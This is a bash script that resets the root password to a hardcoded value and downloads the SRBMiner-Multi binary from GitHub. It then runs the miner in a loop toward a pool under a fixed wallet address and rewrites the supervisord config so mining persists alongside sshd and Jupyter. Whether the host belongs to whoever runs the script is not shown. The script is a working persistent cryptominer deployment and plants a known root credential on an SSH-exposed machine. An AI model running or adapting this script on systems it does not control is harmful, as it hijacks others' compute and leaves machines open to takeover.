#!/bin/bash
apt update -y
apt install -y screen btop moreutils curl iputils-ping
echo 'root:Q!@We34rt56y' | chpasswd
cd /
cd root
mkdir pearl
cd pearl
wget -c -t=0 https://github.com/doktor83/SRBMiner-Multi/releases/download/3.5.4/SRBMiner-Multi-3-5-4-Linux.tar.gz
tar -xf SRBMiner-Multi-3-5-4-Linux.tar.gz
mv ./SRBMiner-Multi-3-5-4/SRBMiner-MULTI ./
rm pearl.sh;
cat <<EOF > pearl.sh
#!/bin/bash
while true; do
        ./SRBMiner-MULTI --algorithm pearlhash --pool pearl-ru.luckypool.io:3360 --wallet prl1pv9r3vsfupa9y9gqha9ncjk3t03a3lwsyct5xnawe5v906lugh6us8tl8p5.$(hostname) &
        sleep 6h
        kill \$PID
        sleep 15s;
done;
EOF
chmod +x ./pearl.sh
screen -dmS p ./pearl.sh 
rm /etc/supervisor/conf.d/supervisord.conf
cat <<EOF > /etc/supervisor/conf.d/supervisord.conf
[supervisord]
nodaemon=true
[program:sshd]
command=/usr/sbin/sshd -D
[program:jupyter]
command=/bin/bash -c 'jupyter notebook --ip=0.0.0.0 --port=8888 --allow-root --no-browser'
[program:delegated_entrypoint]
command=/bin/bash /etc/delegated-entrypoint.sh
[program:pearl]
command=/bin/bash -c 'cd /root/pearl && screen -dmS pearl ./pearl.sh && sleep infinity'
EOF
